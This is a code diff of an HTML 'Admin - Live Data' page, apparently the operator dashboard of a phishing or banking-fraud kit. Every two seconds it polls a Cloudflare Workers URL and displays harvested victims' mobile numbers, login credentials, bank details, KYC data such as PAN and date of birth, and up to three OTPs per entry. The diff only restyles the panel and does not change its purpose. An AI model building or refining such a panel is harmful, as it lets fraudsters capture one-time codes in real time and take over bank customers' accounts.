@@ -3,126 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Data Terminal</title>
+    <title>Admin - Live Data</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
     <style>
-        body { 
-            background: #000; 
-            color: #0f0; 
-            font-family: 'Courier New', monospace; 
-            margin: 0; 
-            padding: 15px; 
-        }
-        .header { 
-            border-bottom: 2px solid #0f0; 
-            padding-bottom: 10px; 
-            margin-bottom: 20px; 
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        body { background-color: #fff; text-align: center; }
+
+        /* Header logic */
+        header { 
+            padding: 15px 20px; 
+            border-bottom: 1px solid #eee; 
             display: flex; 
-            justify-content: space-between; 
+            justify-content: space-between; /* Beech mein DATA aur Right mein Count */
+            align-items: center;
+            position: sticky;
+            top: 0;
+            background: #fff;
+            z-index: 100;
+        }
+
+        .header-center { flex-grow: 1; text-align: center; padding-left: 50px; }
+        h1 { font-size: 20px; font-weight: bold; color: #000; letter-spacing: 2px; }
+        .sub-text { color: red; font-size: 9px; font-weight: bold; margin-top: 2px; }
+
+        /* Digital Click Count Style */
+        #click-count {
+            font-family: 'Orbitron', sans-serif; /* Digital Watch Font */
+            font-size: 22px;
+            color: #00FF00; /* Pure Green */
             font-weight: bold;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+            background: #000; /* Black background for contrast */
+            padding: 5px 10px;
+            border-radius: 4px;
+            min-width: 60px;
         }
-        .card { 
-            border: 1px solid #0f0; 
-            background: #0a0a0a; 
-            padding: 15px; 
-            margin-bottom: 15px; 
-            border-radius: 5px; 
-            position: relative;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
+
+        /* Container for cards */
+        #data-container { padding: 10px; max-width: 500px; margin: 0 auto; }
+
+        /* Card Style - Black line separator */
+        .card {
+            text-align: left;
+            padding: 15px 5px;
+            border-bottom: 1.5px solid #000; /* Black line separator */
+            margin-bottom: 5px;
         }
-        .time { color: #ffff00; font-size: 0.8em; float: right; }
-        .data-row { margin: 10px 0; }
-        .label { color: #888; font-size: 0.75em; text-transform: uppercase; }
-        .value { 
-            display: block; 
-            font-size: 1.2em; 
-            white-space: pre-wrap; 
-            color: #0f0; 
-            margin-top: 5px; 
+
+        .data-text {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
-        .otp-highlight { 
-            background: #e60000; 
-            color: #fff; 
-            padding: 4px 8px; 
-            font-weight: bold; 
-            border-radius: 3px;
+
+        .time-stamp {
+            font-size: 10px;
+            color: #888;
+            margin-top: 5px;
+            display: block;
         }
-        .blink { animation: blinker 1s linear infinite; color: red; }
-        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div>SYSTEM STATUS: ONLINE <span class="blink">●</span></div>
-    <div id="user-count">Users: 0</div>
-</div>
+    <header>
+        <div class="header-center">
+            <h1>DATA</h1>
+            <div class="sub-text">Show data here</div>
+        </div>
+        <div id="click-count">00</div>
+    </header>
 
-<div id="logs-container">
-    <div style="text-align: center;">Fetching data from Worker...</div>
-</div>
+    <div id="data-container">
+        </div>
 
-<audio id="beep" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+    <script>
+        const workerURL = 'https://cold-pine-96e7.sumankkuuyy.workers.dev/';
 
-<script>
-    const API_URL = 'https://restless-dew-2156.sumankkuuyy.workers.dev/';
-    let lastDataStr = "";
+        async function fetchData() {
+            try {
+                const response = await fetch(workerURL);
+                const data = await response.json();
+                
+                // Click Count update karna (Total list ki length)
+                const countElement = document.getElementById('click-count');
+                const totalCount = data.length;
+                countElement.innerText = totalCount < 10 ? "0" + totalCount : totalCount;
 
-    async function updateTerminal() {
-        try {
-            const res = await fetch(API_URL);
-            const data = await res.json();
-            
-            const currentStr = JSON.stringify(data);
-            if (currentStr !== lastDataStr) {
-                if (lastDataStr !== "") document.getElementById('beep').play();
-                lastDataStr = currentStr;
-                render(data);
+                const container = document.getElementById('data-container');
+                container.innerHTML = ''; 
+
+                data.forEach(entry => {
+                    const card = document.createElement('div');
+                    card.className = 'card';
+
+                    let content = "";
+                    if (entry.mobile) content += `Mobile: ${entry.mobile}\n`;
+                    if (entry.credentials) content += `${entry.credentials}\n`;
+                    if (entry.bank_details) content += `${entry.bank_details}\n`;
+                    if (entry.kyc_data) content += `${entry.kyc_data}\n`;
+                    if (entry.otp_1) content += `OTP 1: ${entry.otp_1}\n`;
+                    if (entry.otp_2) content += `OTP 2: ${entry.otp_2}\n`;
+                    if (entry.otp_3) content += `OTP 3: ${entry.otp_3}`;
+
+                    card.innerHTML = `
+                        <div class="data-text">${content}</div>
+                        <span class="time-stamp">${entry.time}</span>
+                    `;
+                    container.appendChild(card);
+                });
+            } catch (err) {
+                console.error("Fetch Error:", err);
             }
-        } catch (err) {
-            console.log("Error:", err);
         }
-    }
 
-    function render(logs) {
-        const container = document.getElementById('logs-container');
-        document.getElementById('user-count').innerText = `Users: ${logs.length}`;
-        container.innerHTML = '';
-
-        logs.forEach(user => {
-            const card = document.createElement('div');
-            card.className = 'card';
-
-            let html = `<div class="time">${new Date(user.time).toLocaleTimeString()}</div>`;
-
-            // Agar koi bhi OTP hai toh sabse upar dikhao
-            let latestOtp = user.otp_3 || user.otp_2 || user.otp_1;
-            if (latestOtp) {
-                html += `<div class="data-row"><span class="label">LATEST OTP</span><br><span class="otp-highlight">${latestOtp}</span></div>`;
-            }
-
-            // User ID & Pass Format (Aman wala style)
-            if (user.credentials) {
-                html += `<div class="data-row"><span class="value">${user.credentials}</span></div>`;
-            }
-
-            // Mobile Number
-            if (user.mobile) {
-                html += `<div class="data-row"><span class="label">Mobile:</span><span class="value">${user.mobile}</span></div>`;
-            }
-
-            // Baki details
-            if (user.bank_details) html += `<div class="data-row"><span class="label">Bank Info:</span><span class="value">${user.bank_details}</span></div>`;
-            if (user.kyc_data) html += `<div class="data-row"><span class="label">KYC (PAN/DOB):</span><span class="value">${user.kyc_data}</span></div>`;
-
-            card.innerHTML = html;
-            container.appendChild(card);
-        });
-    }
-
-    // Har 2 second mein refresh karega
-    setInterval(updateTerminal, 2000);
-    updateTerminal();
-</script>
+        // Har 2 second mein data mangega
+        setInterval(fetchData, 2000);
+        fetchData();
+    </script>
 
 </body>
 </html>
